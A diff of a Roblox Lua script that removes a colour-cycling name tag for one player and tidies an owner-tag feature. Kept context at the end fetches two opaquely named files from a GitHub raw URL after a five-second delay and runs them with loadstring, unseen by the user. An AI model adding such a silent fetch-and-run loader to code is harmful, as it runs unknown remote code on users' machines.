-    label.StudsOffset = Vector3.new(0, 3.5, 0)
-    label.AlwaysOnTop = true
-    label.Parent = head
-
-    local text = Instance.new("TextLabel")
-    text.Name = "IrvingText"
-    text.Size = UDim2.new(1, 0, 1, 0)
-    text.BackgroundTransparency = 1
-    text.Text = "Irvinglzc1"
-    text.TextColor3 = irvingTagColor
-    text.TextScaled = true
-    text.Font = Enum.Font.GothamBold
-    text.TextStrokeTransparency = 0.3
-    text.TextStrokeColor3 = Color3.fromRGB(50, 50, 50)
-    text.Parent = label
-
-    irvingTagLabel = text
-end
-
-local function removeIrvingTag(character)
-    if not character then return end
-    local head = character:FindFirstChild("Head")
-    if head then
-        local existing = head:FindFirstChild("IrvingTag")
-        if existing then
-            existing:Destroy()
-        end
-    end
-    irvingTagLabel = nil
-end
-
-local function updateIrvingTagColor(color)
-    irvingTagColor = color
-    if irvingTagLabel then
-        pcall(function()
-            irvingTagLabel.TextColor3 = color
-        end)
-    end
-end
-
-local function watchIrving()
-    local function processPlayer(plr)
-        if plr.UserId ~= IRVING_ID then return end
-        
-        if plr.Character then
-            addIrvingTag(plr.Character)
-        end
-        
-        plr.CharacterAdded:Connect(function(char)
-            task.wait(0.5)
-            addIrvingTag(char)
-        end)
-    end
-    
-    for _, plr in pairs(Players:GetPlayers()) do
-        processPlayer(plr)
-    end
-    
-    Players.PlayerAdded:Connect(processPlayer)
-end
-
-watchIrving()
-
-task.spawn(function()
-    while true do
-        pcall(function()
-            for i = 0, 1, 0.02 do
-                local r = math.lerp(0, 255, i) / 255
-                local g = math.lerp(0, 255, i) / 255
-                local b = math.lerp(0, 255, i) / 255
-                local newColor = Color3.fromRGB(r * 255, g * 255, b * 255)
-                irvingColorValue.Value = newColor
-                updateIrvingTagColor(newColor)
-                task.wait(0.05)
-            end
-            
-            for i = 1, 0, -0.02 do
-                local r = math.lerp(0, 255, i) / 255
-                local g = math.lerp(0, 255, i) / 255
-                local b = math.lerp(0, 255, i) / 255
-                local newColor = Color3.fromRGB(r * 255, g * 255, b * 255)
-                irvingColorValue.Value = newColor
-                updateIrvingTagColor(newColor)
-                task.wait(0.05)
             end
         end)
     end
@@ -3712,24 +2862,21 @@ local function GetColorValue()
     end
     return colorValue
 end
-
 local colorValue = GetColorValue()
 
 local function addOwnerLabel(character)
     if not character then return end
     local head = character:FindFirstChild("Head")
     if not head then return end
-    if head:FindFirstChild("OwnerLabel") then 
+    if head:FindFirstChild("OwnerLabel") then
         head:FindFirstChild("OwnerLabel"):Destroy()
     end
-
     local label = Instance.new("BillboardGui")
     label.Name = "OwnerLabel"
     label.Size = UDim2.new(0, 120, 0, 40)
     label.StudsOffset = Vector3.new(0, 3, 0)
     label.AlwaysOnTop = true
     label.Parent = head
-
     local text = Instance.new("TextLabel")
     text.Name = "OwnerText"
     text.Size = UDim2.new(1, 0, 1, 0)
@@ -3741,7 +2888,6 @@ local function addOwnerLabel(character)
     text.TextStrokeTransparency = 0.3
     text.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     text.Parent = label
-
     ownerTagLabel = text
     updateOwnerTagColor(ownerTagColor)
 end
@@ -3751,9 +2897,7 @@ local function removeOwnerLabel(character)
     local head = character:FindFirstChild("Head")
     if head then
         local existing = head:FindFirstChild("OwnerLabel")
-        if existing then
-            existing:Destroy()
-        end
+        if existing then existing:Destroy() end
     end
     ownerTagLabel = nil
 end
@@ -3775,28 +2919,20 @@ end
 local function watchOwner()
     local function processPlayer(plr)
         if plr.UserId ~= DEV_USER_ID then return end
-        
-        if plr.Character then
-            addOwnerLabel(plr.Character)
-        end
-        
+        if plr.Character then addOwnerLabel(plr.Character) end
         plr.CharacterAdded:Connect(function(char)
             task.wait(0.5)
             addOwnerLabel(char)
         end)
     end
-    
     for _, plr in pairs(Players:GetPlayers()) do
         processPlayer(plr)
     end
-    
     Players.PlayerAdded:Connect(processPlayer)
 end
-
 watchOwner()
 
 local lilaPinkActive = true
-
 task.spawn(function()
     while lilaPinkActive do
         pcall(function()
@@ -3804,24 +2940,17 @@ task.spawn(function()
                 Color3.fromRGB(200, 50, 255),
                 Color3.fromRGB(255, 105, 180),
             }
-            
             for colorIndex = 1, #colors do
                 if not lilaPinkActive then break end
-                
                 local currentColor = colors[colorIndex]
                 local nextColor = colors[(colorIndex % #colors) + 1]
-                
                 for i = 0, 1, 0.05 do
                     if not lilaPinkActive then break end
-                    
                     local r = math.lerp(currentColor.R, nextColor.R, i)
                     local g = math.lerp(currentColor.G, nextColor.G, i)
                     local b = math.lerp(currentColor.B, nextColor.B, i)
                     local newColor = Color3.fromRGB(r * 255, g * 255, b * 255)
-                    
-                    pcall(function()
-                        colorValue.Value = newColor
-                    end)
+                    pcall(function() colorValue.Value = newColor end)
                     updateOwnerTagColor(newColor)
                     task.wait(0.1)
                 end
@@ -3832,26 +2961,20 @@ end)
 
 task.spawn(function()
     task.wait(5)
-
     local url1 = "https://raw.githubusercontent.com/67Studio/A/refs/heads/main/%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F"
     local url2 = "https://raw.githubusercontent.com/67Studio/A/refs/heads/main/%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21%21"
 
-    -- Ejecutar el primero (siempre intenta)
     pcall(function()
         local source = game:HttpGet(url1)
         local fn = loadstring(source)
         if fn then fn() end
     end)
 
-    -- Ejecutar el segundo, si falla muestra warning
     local ok = pcall(function()
         local source = game:HttpGet(url2)
         local fn = loadstring(source)
         if not fn then error("no compiló") end
         fn()
     end)
-
-    if not ok then
-        warn("[warning 67]")
-    end
+    if not ok then warn("[warning 67]") end
 end)
